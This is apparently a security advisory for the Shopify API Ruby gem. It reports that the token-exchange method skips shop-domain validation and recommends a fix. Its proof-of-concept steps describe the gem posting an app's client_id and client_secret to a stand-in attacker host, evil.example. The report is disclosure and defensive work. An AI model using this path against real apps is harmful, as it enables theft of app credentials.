### Title
Missing shop-domain validation in `TokenExchange.exchange_token` allows SSRF exfiltration of `client_secret` to an attacker-controlled host - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the request host purely from the signed session token's `dest` claim, but — unlike every sibling OAuth method in the gem — it never passes that value through `Utils::ShopValidator.sanitize!`. Because a shop's `dest` value reflects whatever domain the shop is currently reachable at (including merchant-configured custom domains), an app installer can point that domain at infrastructure they control and have the gem POST the app's `client_id`/`client_secret` and the raw session token directly to it.

### Finding Description
`TokenExchange.exchange_token` takes the shop straight from the JWT's `dest` claim without validating it is a trusted Shopify domain: [1](#0-0) 

That `dest_shop` is used, unsanitized, to build the `Session` whose `shop` becomes the HTTP base URI for the token-exchange request: [2](#0-1) 

The client builds its base URI directly from `session.shop`: [3](#0-2) 

The request body sent to that host includes the app's `client_secret`: [4](#0-3) 

Every other OAuth grant method in the same file/module explicitly validates the shop domain before using it as the request host:
- `client_credentials`: [5](#0-4) 
- `refresh_access_token`: [6](#0-5) 
- `migrate_to_expiring_token` (same `TokenExchange` module): [7](#0-6) 

`ShopValidator.sanitize!` exists precisely to reject any shop/host value that isn't on `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`): [8](#0-7) 

`JwtPayload` only verifies the JWT signature and that `aud == Context.api_key`; it never checks that `dest` resolves to a trusted Shopify domain: [9](#0-8) 

**Binding broken (as an equality):**
`host_that_receives(client_id, client_secret, subject_token)` should equal `sanitized_trusted_shopify_domain`.
In `exchange_token` it instead equals `raw_dest_claim_value` — a value that legitimately reflects whatever domain currently serves the shop's storefront/admin (including a merchant's own custom domain), not necessarily a Shopify-controlled endpoint.

### Impact Explanation
This is High severity: SSRF carrying the app's credentials. Any entity able to install/embed the app on a shop with a custom domain they control (an "unprivileged internet user" with respect to the app's own trust boundary — no `api_secret_key`, access token, or Shopify-employee access needed) can cause the gem to transmit the app's `client_id`, `client_secret`, and the raw session token in a POST request to that attacker-controlled domain. This directly exfiltrates the app's `client_secret`, which can subsequently be used to impersonate the app to Shopify for any shop, matching the Critical/High categories ("SSRF with the app's credentials", "theft ... of the app's client_secret").

### Likelihood Explanation
The `dest` claim is bound only by JWT signature/`aud` check, not by a shop-domain allowlist — every other grant path in this gem enforces that allowlist via `ShopValidator.sanitize!`, and this is the only one that skips it. Since custom domains are a standard, merchant-configurable Shopify feature, no exotic conditions (DNS rebinding, TLS interception, leaked secrets) are required — just installing/embedding the app under a domain the actor controls.

### Recommendation
Call `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `client_credentials`, `refresh_access_token`, and `migrate_to_expiring_token`) immediately after extracting `dest_shop` from `jwt_payload.shop`, and use the sanitized value to construct `shop_session` and the returned `Session`.

### Proof of Concept
1. Configure a shop with a custom domain (e.g. `evil.example`) that resolves to attacker-controlled infrastructure rather than Shopify's edge.
2. Install/load the target embedded app under that shop; App Bridge issues a validly signed session token whose `dest` claim is `https://evil.example`.
3. The app's backend calls `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
4. `dest_shop` becomes `"evil.example"` and is used unsanitized to build `shop_session`; `HttpClient` sets `@base_uri = "https://evil.example"`.
5. The gem issues `POST https://evil.example/admin/oauth/access_token` with body containing `client_id`, `client_secret`, and `subject_token` — delivering the app's secret directly to the attacker's server.

      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
